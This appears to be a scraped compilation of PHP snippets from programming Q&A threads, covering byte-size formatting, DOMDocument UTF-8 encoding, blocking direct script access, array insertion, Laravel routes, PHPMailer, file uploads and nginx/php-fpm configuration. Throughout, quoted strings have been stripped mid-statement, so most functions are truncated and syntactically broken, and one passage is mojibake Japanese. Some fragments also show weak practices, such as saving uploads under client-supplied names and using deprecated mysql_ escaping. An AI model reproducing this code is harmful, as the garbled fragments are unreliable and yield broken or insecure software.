void parse_str(str $input, array $output); $str = "first=value&arr[]=foo+bar&arr[]=baz"; parse_str($str); echo $first; echo $arr[0]; echo $arr[1]; parse_str($str, $output); echo $output[ echo $output[ echo $output[
$string= goto landing; $string = preg_replace( landing:
function formatBytes($bytes, $precision = 2) { $units = array( $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); return round($bytes, $precision) . }
function formatBytes($size, $precision = 2) { $base = log($size, 1024); $suffixes = array( return round(pow(1024, $base - floor($base)), $precision) . } echo formatBytes(24962496); echo formatBytes(24962496, 0); echo formatBytes(24962496, 4);
$base = log($size) / log(1024); $suffix = array("", "k", "M", "G", "T")[floor($base)]; return pow(1024, $base - floor($base)) . $suffix;
public static function bytes($bytes, $force_unit = NULL, $format = NULL, $si = TRUE) { $format = ($format === NULL) ? if ($si == FALSE OR strpos($force_unit, { $units = array( $mod = 1024; } else { $units = array( $mod = 1000; } if (($power = array_search((string) $force_unit, $units)) === FALSE) { $power = ($bytes > 0) ? floor(log($bytes, $mod)) : 0; } return sprintf($format, $bytes / pow($mod, $power), $units[$power]); }
$size = 11485760; echo bcdiv($size, 1048576, 0); echo bcdiv($size, 1048576, 2); echo bcdiv($size, 1048576, 2); echo bcdiv($size, 1048576, 3);
/** * @param int $bytes Number of bytes (eg. 25907) * @param int $precision [optional] Number of digits after the decimal point (eg. 1) * @return string Value converted with unit (eg. 25.3KB) */ function formatBytes($bytes, $precision = 2) { $unit = ["B", "KB", "MB", "GB"]; $exp = floor(log($bytes, 1024)) | 0; return round($bytes / (pow(1024, $exp)), $precision).$unit[$exp]; }
function formatBytes($bytes, $precision = 2) { if ($bytes > pow(1024,3)) return round($bytes / pow(1024,3), $precision)."GB"; else if ($bytes > pow(1024,2)) return round($bytes / pow(1024,2), $precision)."MB"; else if ($bytes > 1024) return round($bytes / 1024, $precision)."KB"; else return ($bytes)."B"; }
function format_filesize($B, $D=2){ $S = $F = floor((strlen($B) - 1) / 3); return sprintf("%.{$D}f", $B/pow(1024, $F)). }
function format_filesize($B, $D=2){ $S = $F = floor((strlen($B) - 1) / 3); return sprintf("%.{$D}f", $B/pow(1024, $F)). }
function formatBytes($size, $precision = 0){ $unit = [ for($i = 0; $size >= 1024 && $i < count($unit)-1; $i++){ $size /= 1024; } return round($size, $precision). } echo formatBytes(
function file_format_size($bytes, $decimals = 2) { $unit_list = array( if ($bytes == 0) { return $bytes . } $unit_count = count($unit_list); for ($i = $unit_count - 1; $i >= 0; $i--) { $power = $i * 10; if (($bytes >> $power) >= 1) return round($bytes / (1 << $power), $decimals) . } }
function format_size($size) { $mod = 1024; $units = explode( for ($i = 0; $size > $mod; $i++) { $size /= $mod; } return round($size, 2) . }
function changeType($size, $type, $end){ $arr = [ $tSayi = array_search($type, $arr); $eSayi = array_search($end, $arr); $pow = $eSayi - $tSayi; return $size * pow(1024 * $pow) . } echo changeType(500,
function formatBytes($bytes, $precision = 2) { $units = [ $i = 0; while($bytes > 1024) { $bytes /= 1024; $i++; } return round($bytes, $precision) . }
function bytesToSize($bytes) { $sizes = [ if ($bytes == 0) return $i = intval(floor(log($bytes) / log(1024))); if ($i == 0) return $bytes . return round(($bytes / pow(1024, $i)),1,PHP_ROUND_HALF_UP). } echo bytesToSize(10000050300);
function byte_format($size) { $bytes = array( foreach ($bytes as $val) { if (1024 <= $size) { $size = $size / 1024; continue; } break; } return round( $size, 1 ) . $val; }
/** * Generates a string representation for the given byte count. * * @param $size * A size in bytes. * * @return * A string representation of the size. */ function format_size($size) { if ($size < 1024) { return $size . } else { $size = $size / 1024; $units = [ foreach ($units as $unit) { if (round($size, 2) >= 1024) { $size = $size / 1024; } else { break; } } return round($size, 2) . } }
function formatBytes($bytes, $precision) { $unit_list = array ( ); $bytes = max($bytes, 0); $index = floor(log($bytes, 2) / 10); $index = min($index, count($unit_list) - 1); $bytes /= pow(1024, $index); return round($bytes, $precision) . }
function formatBytes($bytes, $precision) { $unit_list = array ( ); $index_max = count($unit_list) - 1; $bytes = max($bytes, 0); for ($index = 0; $bytes >= 1024 && $index < $index_max; $index++) { $bytes /= 1024; } return round($bytes, $precision) . }
function renderSize($byte,$precision=2,$mibi=true) { $base = (string)($mibi?1024:1000); $labels = array( for($i=8;$i>=1;$i--) if(bccomp($byte,bcpow($base, $i))>=0) return bcdiv($byte,bcpow($base, $i), $precision). return $byte. }
function swissConverter($value, $format = true, $precision = 2) { $bytes = preg_replace_callback( function ($m) { switch (strtolower($m[2])) { case case case case } return $m[1]; }, $value); if(is_numeric($bytes)) { if($format === true) { $base = log($bytes, 1024); $suffixes = array( return round(pow(1024, $base - floor($base)), $precision) . $suffixes[floor($base)]; } else { return $bytes; } } else { return NULL; } }
<?php function human_filesize($bytes, $decimals = 2) { $sz = $factor = floor((strlen($bytes) - 1) / 3); return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor]; } ?>
function convertMemorySize($strval, string $to_unit = { $strval = strtolower(str_replace( $val = floatval($strval); $to_unit = strtolower(trim($to_unit))[0]; $from_unit = str_replace($val, $from_unit = empty($from_unit) ? $units = if ($from_unit !== $val *= 1024 ** (strpos($units, $from_unit) + 1); if ($to_unit !== $val /= 1024 ** (strpos($units, $to_unit) + 1); return $val; } convertMemorySize( convertMemorySize( convertMemorySize( convertMemorySize( convertMemorySize(2048,
function convertToReadableSize($size) { $base = log($size) / log(1024); $suffix = array("B", "KB", "MB", "GB", "TB"); $f_base = floor($base); return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base]; }
echo convertToReadableSize(1024); echo convertToReadableSize(1024 * 1024);
function formatUnit($value, $precision = 2) { $units = explode( if ($value < 0) { return } if ($value < 1) { return $value . $units[0]; } $power = min( floor(log($value, 1024)), count($units) - 1 ); return round($value / pow(1024, $power), $precision) . $units[$power]; }
function formatBytes($bytes, $precision = 2) { $units = array( $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, $precision) . }
$profile = "<div><p>various japanese characters</p></div>"; $dom = new DOMDocument(); $dom->loadHTML($profile); $divs = $dom->getElementsByTagName( foreach ($divs as $div) { echo $dom->saveHTML($div); }
ã¤ãªãã¤å·ã·ã«ã´ã«ã¦ãã¢ã¤ã«ã©ã³ãç³»ã®å®¶åº­ã«ã9äººåå¼ã®5çªç®ã¨ãã¦çã¾ãããå½¼ãå«ãã¦4äººãä¿³åªã«ãªã£ããç¶è¦ªã¯æ¨æã®ã»ã¼ã«ã¹ãã³ã§ãæ¯è¦ªã¯éµä¾¿å±ã®å®¢å®¤ä¿ã ã£ããé«æ ¡æä»£ã¯ã­ã£ãã£ã®ã¢ã«ãã¤ãã«å¤ãã¿ãæè²è³éãåããªããã«ããªãã¯ç³»ã®é«æ ¡ã¸é²å­¦ã
イリノイ州シカゴにて、アイルランド系の家庭に、9人兄弟の5番目として生まれる。彼を含めて4人が俳優になった。父親は木材のセールスマンで、母親は郵便局の客室係だった。高校時代はキャディのアルバイトに勤しみ、教育資金を受けながらカトリック系の高校へ進学
$profile = "<div lang=ja><p>イリノイ州シカゴにて、アイルランド系の家庭に、</p></div>"; $dom = new DOMDocument(); $dom->loadHTML($profile); echo $dom->saveHTML(); echo $profile;
<div lang="ja"><p>ã‚¤ãƒªãƒŽã‚¤å·žã‚·ã‚«ã‚´ã«ã¦ã€ã‚¢ã‚¤ãƒ«ãƒ©ãƒ³ãƒ‰ç³»ã®å®¶åº­ã«ã€</p></div> <div lang="ja"><p>イリノイ州シカゴにて、アイルランド系の家庭に、</p></div>
$profile = $dom = new DOMDocument(); $dom->loadHTML( echo $dom->saveHTML();
$profile = $dom = new DOMDocument(); $dom->loadHTML(mb_convert_encoding($profile, echo $dom->saveHTML();
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
$dom = new DomDocument( if ($dom->loadHTMLFile($url) == false) { } else { }
$dom = new DomDocument( $str = file_get_contents($url); if ($dom->loadHTML(mb_convert_encoding($str, }
$dom = new \DOMDocument; $dom->loadHTML(utf8_decode($html)); ... return utf8_encode( $dom->saveHTML());
$dom = new DOMDocument(); $dom->loadHTML( echo $dom->saveHTML(); echo $profile;
PHP 5.5.1-2+debphp.org~precise+2 (cli) (built: Aug 6 2013 10:49:43) Copyright (c) 1997-2013 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2013 Zend Technologies with Zend OPcache v7.0.2-dev, Copyright (c) 1999-2013, by Zend Technologies with Xdebug v2.2.3, Copyright (c) 2002-2013, by Derick Rethans
sudo apt-get install php5-json sudo service php5-fpm restart
<?php if($this->value): ?> Hello <?php elseif($this->asd): ?> Your name is: <?= $this->name ?> <?php else: ?> You don <?php endif; ?>
<? if($condition) { ?> HTML content here <? } else { ?> Other HTML content here <? } ?>
if (my_horn_is_red or her_umbrella_is_yellow) { foreach (day in week) { sing(a_different_song[day]); } }
<?php if ($foo) { ?> <p>Foo!</p><?php } else { ?> <p>Bar!</p><?php }
<?php if ($foo): ?> <p>Foo!</p><?php else: ?> <p>Bar!</p><?php endif; ?>
<?php if ( $this->hasIterable ): ?> <h2>Iterable</h2> <ul> <?php foreach ( $this->iterable as $key => $val ):?> <?php for ( $i = 0; $i <= $val; $i++ ): ?> <li><?php echo $key ?></li> <?php endfor; ?> <?php endforeach; ?> </ul> <?php elseif ( $this->hasScalar ): ?> <h2>Scalar</h2> <?php for ( $i = 0; $i <= $this->scalar; $i++ ): ?> <p>Foo = Bar</p> <?php endfor; ?> <?php else: ?> <h2>Other</h2> <?php if ( $this->otherVal === true ): ?> <p>Spam</p> <?php else: ?> <p>Eggs</p> <?php endif; ?> <?php endif; ?>
<?php if ( $this->hasIterable ){ ?> <h2>Iterable</h2> <ul> <?php foreach ( $this->iterable as $key => $val ){?> <?php for ( $i = 0; $i <= $val; $i++ ){ ?> <li><?php echo $key ?></li> <?php } ?> <?php } ?> </ul> <?php } elseif ( $this->hasScalar ){ ?> <h2>Scalar</h2> <?php for ( $i = 0; $i <= $this->scalar; $i++ ){ ?> <p>Foo = Bar</p> <?php } ?> <?php } else { ?> <h2>Other</h2> <?php if ( $this->otherVal === true ){ ?> <p>Spam</p> <?php } else { ?> <p>Eggs</p> <?php } ?> <?php } ?>
<?php if($something){ doThis(); }else{ echo <p>This is a paragraph</p> <p>and another paragraph</p> } ?>
<?php if( $this->isEnabledViewSwitcher() ): ?> <p class="view-mode"> <?php $_modes = $this->getModes(); ?> <?php if($_modes && count($_modes)>1): ?> <label><?php echo $this->__( <?php foreach ($this->getModes() as $_code=>$_label): ?> <?php if($this->isModeActive($_code)): ?> <strong title="<?php echo $_label ?>" class="<?php echo strtolower($_code); ?>"><?php echo $_label ?></strong>&nbsp; <?php else: ?> <a href="<?php echo $this->getModeUrl($_code) ?>" title="<?php echo $_label ?>" class="<?php echo strtolower($_code); ?>"><?php echo $_label ?></a>&nbsp; <?php endif; ?> <?php endforeach; ?> <?php endif; ?> </p> <?php endif; ?>
<?php if (question1) { $variable_1 = somehtml; } else { $variable_1 = someotherhtml; } if (question2) { $variable_2 = somehtml2; } else { $variable_2 = someotherhtml2; } etc. $output=<<<HERE htmlhtmlhtml$variable1htmlhtmlhtml$varianble2htmletcetcetc HERE; echo $output; ?>
if ( $REQUEST_URL == $URL_OF_CURRENT_PAGE ) die ("Direct access not premitted");
if(count(get_included_files()) ==1) exit("Direct access not permitted.");
<FilesMatch "\.(inc)$"> Order deny,allow Deny from all </FilesMatch>
if( count(get_included_files()) == ((version_compare(PHP_VERSION, { exit( }
$includeData = file_get_contents("http: $src = $_SERVER[ $auth = authoriseIP($src); if( !$auth ) exit(
if($key!="serv97602"){header("Location: ".$dart);exit();}
$secure_dir=dirname($_SERVER[ include($secure_dir."securepage.php");
if (!$including) exit("direct access not permitted");
debug_backtrace() || die ("Direct access not permitted");
app/ | +--pub/ | +--lib/ | +--conf/ | +--models/ | +--views/ | +--controllers/
if (empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && $_SERVER["HTTP_X_REQUESTED_WITH"] != "XMLHttpRequest") { if (realpath($_SERVER["SCRIPT_FILENAME"]) == __FILE__) { header("Location: /403"); exit; } }
if (array_search(__FILE__, get_included_files()) === 0) { echo } else { echo }
<?php if (eregi("YOUR_INCLUDED_PHP_FILE_NAME", $_SERVER[ die("<h4>You don } ?>
<?php if (eregi("some_functions.php", $_SERVER[ die("<h4>You don } ?>
if ( strpos(strtolower($_SERVER[ { header("Location: ../../index.php"); die("..."); }
/** * Hmmm... why is my netbeans debugger only showing a blank white page * for this script (that is being tested outside the framework)? * Later... I just don * Much later... There are no error messages or anything! * Why is it not working!?! * I HATE PHP!!! * * Scroll back to the top of my 100s of lines of code... * U_U * * Sorry PHP. I didn */ class perfectlyWorkingCode {} perfectlyWorkingCode::nowDoingStuffBecauseIRememberedToCommentOutTheDie();
function forbidDirectAccess($file) { $self = getcwd()."/".trim($_SERVER["PHP_SELF"], "/"); (substr_compare($file, $self, -strlen($self)) != 0) or die( }
<?php $url = if (false !== strpos($url, die ("Direct access not premitted"); } ?>
$currentFileInfo = pathinfo(__FILE__); $requestInfo = pathinfo($_SERVER[ if($currentFileInfo[ }
/** * block attempts to directly run this script */ if (getcwd() == dirname(__FILE__)) { die( }
<input type="checkbox" name="check_list" value="<? echo $row[
<form action="test.php" method="post"> <input type="checkbox" name="check_list[]" value="value 1"> <input type="checkbox" name="check_list[]" value="value 2"> <input type="checkbox" name="check_list[]" value="value 3"> <input type="checkbox" name="check_list[]" value="value 4"> <input type="checkbox" name="check_list[]" value="value 5"> <input type="submit" /> </form> <?php if(!empty($_POST[ foreach($_POST[ echo $check; } } ?>
<input type="checkbox" name="check_list[]" value="<?=$rowid?>" /> <input type="checkbox" name="check_list[]" value="<?=$rowid?>" /> <input type="checkbox" name="check_list[]" value="<?=$rowid?>" />
<input type="checkbox" name="check_list[]" value="…" />
<input type="checkbox" name="check_list[<? echo $row[
if(!empty($_POST[ foreach($_POST[ echo "$report_id was checked! "; } }
if(isset($_POST[ echo $report_id . " was checked!<br/>"; }
<input type="checkbox" name="check_list[1]" alt="Checkbox" value="checked"> <input type="checkbox" name="check_list[2]" alt="Checkbox" value="checked"> <input type="checkbox" name="check_list[3]" alt="Checkbox" value="checked">
foreach($array as $key => $val) { $new_array[$val]=$val; }
$res = array_slice($array, 0, 3, true) + array("my_key" => "my_value") + array_slice($array, 3, count($array)-3, true);
$array = array( ); $res = array_slice($array, 0, 3, true) + array("my_key" => "my_value") + array_slice($array, 3, count($array) - 1, true) ; print_r($res);
$array_1 = array( ); array_splice($array_1, 3, 0, print_r($array_1);
Array( [0] => zero [1] => one [2] => two [3] => more [4] => three )
function array_insert($arr, $insert, $position) { $i = 0; foreach ($arr as $key => $value) { if ($i == $position) { foreach ($insert as $ikey => $ivalue) { $ret[$ikey] = $ivalue; } } $ret[$key] = $value; $i++; } return $ret; }
function insert($array, $index, $val) { $size = count($array); if (!is_int($index) || $index < 0 || $index > $size) { return -1; } else { $temp = array_slice($array, 0, $index); $temp[] = $val; return array_merge($temp, array_slice($array, $index, $size)); } }
function insert($array, $index, $val) { $temp = array(); $size = count($array); if (!is_int($index) || $index < 0 || $index > $size) { echo "Error: Wrong index at Insert. Index: " . $index . " Current Size: " . $size; echo "<br/>"; return false; } $temp = array_slice($array, 0, $index); array_push($temp, $val); $temp = array_merge($temp, array_slice($array, $index, $size)); $array = $temp; return $array; }
$result = insert(array(1,2,3,4,5),0, 0); echo "<pre>"; echo "<br/>"; print_r($result); echo "</pre>"; $result = insert(array(1,2,3,4,5),2, "a"); echo "<pre>"; print_r($result); echo "</pre>"; $result = insert(array(1,2,3,4,5) ,4, "b"); echo "<pre>"; print_r($result); echo "</pre>"; $result = insert(array(1,2,3,4,5),5, 6); echo "<pre>"; echo "<br/>"; print_r($result); echo "</pre>";
Array ( [0] => 0 [1] => 1 [2] => 2 [3] => 3 [4] => 4 [5] => 5 ) Array ( [0] => 1 [1] => 2 [2] => a [3] => 3 [4] => 4 [5] => 5 ) Array ( [0] => 1 [1] => 2 [2] => 3 [3] => 4 [4] => b [5] => 5 ) Array ( [0] => 1 [1] => 2 [2] => 3 [3] => 4 [4] => 5 [5] => 6 )
$list = array( ); $afterIndex = 2; $newVal= array( $newList = array_merge(array_slice($list,0,$afterIndex+1), $newVal,array_slice($list,$afterIndex+1));
function insert_into_array( $array, $search_key, $insert_key, $insert_value, $insert_after_founded_key = true, $append_if_not_found = false ) { $new_array = array(); foreach( $array as $key => $value ){ if( $key === $search_key && ! $insert_after_founded_key ) $new_array[ $insert_key ] = $insert_value; $new_array[ $key ] = $value; if( $key === $search_key && $insert_after_founded_key ) $new_array[ $insert_key ] = $insert_value; } if( $append_if_not_found && count( $array ) == count( $new_array ) ) $new_array[ $insert_key ] = $insert_value; return $new_array; }
$array1 = array( 0 => 1 => 2 => 3 => 4 => ); $array2 = array( ); $array3 = array( 0 => 1 => 64 => 3 => 4 => ); print_r( insert_into_array( $array1, 3, print_r( insert_into_array( $array2, print_r( insert_into_array( $array3, 64, print_r( insert_into_array( $array3,
Array ( [0] => zero [1] => one [2] => two [3] => three [three+] => three+ value [4] => four ) Array ( [zero] => [one] => [two] => [three] => [three+] => three+ value [four] => ) Array ( [0] => zero [1] => one [before-64] => before-64 value [64] => 64 [3] => three [4] => four ) Array ( [0] => zero [1] => one [64] => 64 [3] => three [4] => four [new key] => new value )
function magic_insert($index,$value,$input_array ) { if (isset($input_array[$index])) { $output_array = array($index=>$value); foreach($input_array as $k=>$v) { if ($k<$index) { $output_array[$k] = $v; } else { if (isset($output_array[$k]) ) { $output_array[$k+1] = $v; } else { $output_array[$k] = $v; } } } } else { $output_array = $input_array; $output_array[$index] = $value; } ksort($output_array); return $output_array; }
/** * Inserts any number of scalars or arrays at the point * in the haystack immediately after the search key ($needle) was found, * or at the end if the needle is not found or not supplied. * Modifies $haystack in place. * @param array &$haystack the associative array to search. This will be modified by the function * @param string $needle the key to search for * @param mixed $stuff one or more arrays or scalars to be inserted into $haystack * @return int the index at which $needle was found */ function array_insert_after(&$haystack, $needle = if (! is_array($haystack) ) return $haystack; $new_array = array(); for ($i = 2; $i < func_num_args(); ++$i){ $arg = func_get_arg($i); if (is_array($arg)) $new_array = array_merge($new_array, $arg); else $new_array[] = $arg; } $i = 0; foreach($haystack as $key => $value){ ++$i; if ($key == $needle) break; } $haystack = array_merge(array_slice($haystack, 0, $i, true), $new_array, array_slice($haystack, $i, null, true)); return $i; }
/** * Insert data at position given the target key. * * @param array $array * @param mixed $target_key * @param mixed $insert_key * @param mixed $insert_val * @param bool $insert_after * @param bool $append_on_fail * @param array $out * @return array */ function array_insert( array $array, $target_key, $insert_key, $insert_val = null, $insert_after = true, $append_on_fail = false, $out = []) { foreach ($array as $key => $value) { if ($insert_after) $out[$key] = $value; if ($key == $target_key) $out[$insert_key] = $insert_val; if (!$insert_after) $out[$key] = $value; } if (!isset($array[$target_key]) && $append_on_fail) { $out[$insert_key] = $insert_val; } return $out; }
$colors = [ ]; $colors = array_insert($colors, die(var_dump($colors));
function array_splice_after_key($array, $key, $array_to_insert) { $key_pos = array_search($key, array_keys($array)); if($key_pos !== false){ $key_pos++; $second_array = array_splice($array, $key_pos); $array = array_merge($array, $array_to_insert, $second_array); } return $array; }
class ArrayHelper { public static function insertValueAtPos(array &$array, $pos, $value) { $maxIndex = count($array)-1; if ($pos === 0) { array_unshift($array, $value); } elseif (($pos > 0) && ($pos <= $maxIndex)) { $firstHalf = array_slice($array, 0, $pos); $secondHalf = array_slice($array, $pos); $array = array_merge($firstHalf, array($value), $secondHalf); } else { throw new IndexOutOfBoundsException(); } } }
$array = array( $insertValue = \ArrayHelper::insertValueAtPos($array, 3, $insertValue);
Array ( [0] => a [1] => b [2] => c [3] => d [4] => e )
Array ( [0] => a [1] => b [2] => c [3] => insert [4] => d [5] => e )
function arrayInsert($array, $item, $position) { $begin = array_slice($array, 0, $position); array_push($begin, $item); $end = array_slice($array, $position); $resultArray = array_merge($begin, $end); return $resultArray; }
$toto = array( ); $ret = array_splice($toto, 3 ); $toto = $toto + array("my_key" => "my_value") + $ret; print_r($toto);
/** * Insert element into an array at a specific key. * * @param array $input_array * The original array. * @param array $insert * The element that is getting inserted; array(key => value). * @param string $target_key * The key name. * @param int $location * 1 is after, 0 is replace, -1 is before. * * @return array * The new array with the element merged in. */ function insert_into_array_at_key(array $input_array, array $insert, $target_key, $location = 1) { $output = array(); $new_value = reset($insert); $new_key = key($insert); foreach ($input_array as $key => $value) { if ($key === $target_key) { if ($location == -1) { $output[$new_key] = $new_value; $output[$key] = $value; } if ($location == 0) { $output[$new_key] = $new_value; } if ($location == 1) { $output[$key] = $value; $output[$new_key] = $new_value; } } else { if (is_numeric($key)) { while (isset($output[$key])) { $key++; } } $output[$key] = $value; } } if (!isset($output[$new_key])) { if ($location == -1) { $output = $insert + $output; } if ($location == 1) { $output[$new_key] = $new_value; } } return $output; }
$array_1 = array( ); $array_2 = array( ); $array_1 = insert_into_array_at_key($array_1, array( print_r($array_1); $array_2 = insert_into_array_at_key($array_2, array( print_r($array_2);
Array ( [0] => zero [1] => one [2] => two [sample_key] => sample_value [3] => three ) Array ( [zero] => 0 [one] => 1 [two] => 2 [sample_key] => sample_value [three] => 3 )
array_splice($array_1, 3, 0 , true); $array_1[3] = array(
function arrayInsert($target, $byKey, $byOffset, $valuesToInsert, $afterKey) { if (isset($byKey)) { if (is_numeric($byKey)) $byKey = (int)floor($byKey); $offset = 0; foreach ($target as $key => $value) { if ($key === $byKey) break; $offset++; } if ($afterKey) $offset++; } else { $offset = $byOffset; } $targetLength = count($target); $targetA = array_slice($target, 0, $offset, true); $targetB = array_slice($target, $offset, $targetLength, true); return array_merge($targetA, $valuesToInsert, $targetB); }
$target = [ 2 => 21, ]; $insertValues = [ 3 ]; var_dump(arrayInsert($target, 2, null, $valuesToInsert, true)); var_dump(arrayInsert($target, var_dump(arrayInsert($target, null, 2, $valuesToInsert, null));
function array_insert($arr, $insert, $position) { $i = 0; $ret = array(); foreach ($arr as $key => $value) { if ($i == $position) { $ret[] = $insert; } $ret[] = $value; $i++; } return $ret; }
/** * * Insert an element after an index in an array * @param array $array * @param string|int $key * @param mixed $value * @param string|int $offset * @return mixed */ function array_splice_associative($array, $key, $value, $offset) { if (!is_array($array)) { return $array; } if (array_key_exists($key, $array)) { unset($array[$key]); } $return = array(); $inserted = false; foreach ($array as $k => $v) { $return[$k] = $v; if ($k == $offset && !$inserted) { $return[$key] = $value; $inserted = true; } } if (!$inserted) { $return[$key] = $value; } return $return; }
$slightly_damaged = array_merge(array_slice($slightly_damaged, 0, 4, true) + array("4" => "0.0"), array_slice($slightly_damaged, 4, count($slightly_damaged)-4, true));
<?php $foo = function myFunc() { $baz = 42; echo $foo; echo $baz; } echo $foo; echo $baz;
<?php function myFunc() { include echo $foo; } myFunc(); echo $foo;
function foo() { $foo = $bar = function () { $baz = }; }
$foo = class Bar { public function baz() { $baz = } }
$foo = $baz = function () use ($foo) { echo $foo; }; $baz();
$foo = function baz() { global $foo; echo $foo; $foo = }
function countSheep($num) { static $counter = 0; $counter += $num; echo "$counter sheep jumped over fence"; } countSheep(1); countSheep(2); countSheep(3);
1 sheep jumped over fence 3 sheep jumped over fence 6 sheep jumped over fence
function countSheep($num) { static $counter = 0; $counter += sqrt($num); echo "$counter sheep jumped over fence"; }
2 sheep jumped over fence 5 sheep jumped over fence 9 sheep jumped over fence
class SomeClass { public function foo() { static $x = 0; echo ++$x; } } $object1 = new SomeClass; $object2 = new SomeClass; $object1->foo(); $object2->foo(); $object1->foo(); $object2->foo();
<?php $a = 1; function test() { echo $a; } test(); ?>
function filterThis($string) { $string = mysql_real_escape_string($string); $string = htmlentities($string); etc... return $string; }
$mysql[ $sql = "SELECT * FROM userlist WHERE username = $result = mysql_query($sql);
function filterThis($string) { return mysql_real_escape_string($string); }
$query = sprintf("SELECT * FROM users WHERE user= mysql_real_escape_string($user), mysql_real_escape_string($password) );
use Illuminate\Support\Facades\Route; $currentPath= Route::getFacadeRoot()->current()->uri();
$currentPath= Route::getFacadeRoot()->current()->uri();
use Illuminate\Support\Facades\Route; Route::currentRouteName();
<?php $path = Route::getCurrentRoute()->getPath(); ?> <?php if (starts_with($path,
$route = Route::current(); $name = Route::currentRouteName(); $action = Route::currentRouteAction();
public function someAction(Request $request) { $routeName = $request->route()->getName(); }
use Illuminate\Routing\Router; public function index(Request $request, Router $router) { return view($router->currentRouteNamed( }
public function index(Request $request) { return view(\Route::currentRouteNamed( }
public function index(Request $request) { return view(\Route::is( }
$route = Route::current(); $name = Route::currentRouteName(); $action = Route::currentRouteAction();
<html><head> <script type="text/javascript"> function logout() { var xmlhttp; if (window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); } else if (window.ActiveXObject) { xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); } if (window.ActiveXObject) { document.execCommand("ClearAuthenticationCache"); window.location.href= } else { xmlhttp.open("GET", xmlhttp.send(""); xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) {window.location.href= } } return false; } </script> </head> <body> <a href=" </body> </html>
session_start(); function LogOut() { session_destroy(); session_unset($_SESSION[ session_unset($_SESSION[ header("Location: /", TRUE, 301); } function Login(){ global $realm; if (empty($_SESSION[ session_regenerate_id(); $_SESSION[ } if (!IsAuthenticated()) { header( header( $_SESSION[ die( } $_SESSION[ } function IsAuthenticated(){ global $realm; global $users; if (empty($_SERVER[ return False; if (!($data = http_digest_parse($_SERVER[ !isset($users[$data[ return False; $A1 = md5($data[ $A2 = md5($_SERVER[ $valid_response = md5($A1. if ($data[ return False; return True; }
<?php if (!isset($_SERVER[ header( header( echo exit; } ?>
function isLoggedIn() { return $isLoggedIn && !$_SESSION[ }
$uploads_dir = foreach ($_FILES["pictures"]["error"] as $key => $error) { if ($error == UPLOAD_ERR_OK) { $tmp_name = $_FILES["pictures"]["tmp_name"][$key]; $name = $_FILES["pictures"]["name"][$key]; move_uploaded_file($tmp_name, "$uploads_dir/$name"); } }
$source_file = $destination_path = rename($source_file, $destination_path . pathinfo($source_file, PATHINFO_BASENAME));
require("class.phpmailer.php"); $mail -> charSet = "UTF-8"; $mail = new PHPMailer(); $mail->IsSMTP(); $mail->Host = "smtp.mydomain.org"; $mail->From = "name@mydomain.org"; $mail->SMTPAuth = true; $mail->Username ="username"; $mail->Password="passw"; $mail->FromName = mb_convert_encoding($header, "UTF-8", "auto"); $mail->AddAddress($emladd); $mail->AddAddress("mytest@gmail.com"); $mail->AddBCC( $mail->Subject = $sub; $mail->Body = $message; $mail->WordWrap = 50; if(!$mail->Send()) { echo echo }
$mail -> CharSet = "UTF-8"; $mail = new PHPMailer();
$mail = new PHPMailer(); $mail->CharSet = "UTF-8"; $mail->Encoding = "16bit";
$mail = new PHPMailer(); $mail->From = $mail->FromName = $mail->AddAddress( $mail->Subject = $mail->Body = $mail->IsHTML(true); $mail->CharSet = $mail->Send();
$someSubjectWithTildes = $mailer->CharSet = $mailer->Encoding = $mailer->Subject = html_entity_decode($someSubjectWithTildes);
$mail = new PHPMailer(); $mail -> CharSet = "UTF-8";
<?php if(!function_exists( $res = if(in_array( $res = ?> <html> <head> <title>A mod_rewrite availability check !</title></head> <body> <p><?php echo apache_get_version(),"</p><p>mod_rewrite $res"; ?></p> </body> </html>
<IfModule mod_rewrite.c> SetEnv HTTP_MOD_REWRITE On RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d </IfModule>
<?php foreach( apache_get_modules() as $module ) echo "$module<br />"; ?>
/** * -------------------------------------------------------------- * MOD REWRITE CHECK * -------------------------------------------------------------- * - By A H Abid * Define Constant for MOD REWRITE * * Check if server allows MOD REWRITE. Checks for both * Apache and IIS. * */ if( function_exists( $mod_rewrite = TRUE; elseif( isset($_SERVER[ $mod_rewrite = TRUE; else $mod_rewrite = FALSE; define(
$this->db->select_max( $result= $this->db->get( echo $result[
public function insert_data_function($your_data) { $this->db->insert("your_table",$your_data); $last_id = $this->db->insert_id(); return $last_id; }
$this->db->insert( $last_id = $this->db->insert_id(); echo $last_id
if($this->db->insert( return $this->db->insert_id(); } return false
$method = $_SERVER[ $request = split("/", substr(@$_SERVER[ switch ($method) { case ....some put action.... break; case ....some post action.... break; case ....some get action.... break; case ....some delete action.... break; }
POST: /cars/ { make:chevrolet, model:malibu, colors:[red, green, blue, grey] }
Create -> Post Read -> Get Update -> Put Delete -> Delete
POST /zzz/cars Content-Type: application/xml <--- indicates we sent XML to server Accept: application/json <--- indicates we want get data back in JSON format
function drupal_is_cli() { return (!isset($_SERVER[ }
server { listen 80; root /home/mike/www/606club; index index.php index.html; server_name mikeglaz.com www.mikeglaz.com; error_log /var/log/nginx/error.log; location ~ \.php$ { fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; include fastcgi_params; } }
location ~ \.php$ { include /path/to/fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root/$fastcgi_script_name; }
fastcgi_param PATH_TRANSLATED $document_root$fastcgi_script_name;
$ file /var/run/php5-fpm.sock /var/run/php5-fpm.sock: socket
$ sudo /etc/init.d/php5-fpm restart [ ok ] Restarting php5-fpm (via systemctl): php5-fpm.service.
location ~ \.php$ { include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; }
$ file /etc/nginx/fastcgi_params /etc/nginx/fastcgi_params: ASCII text
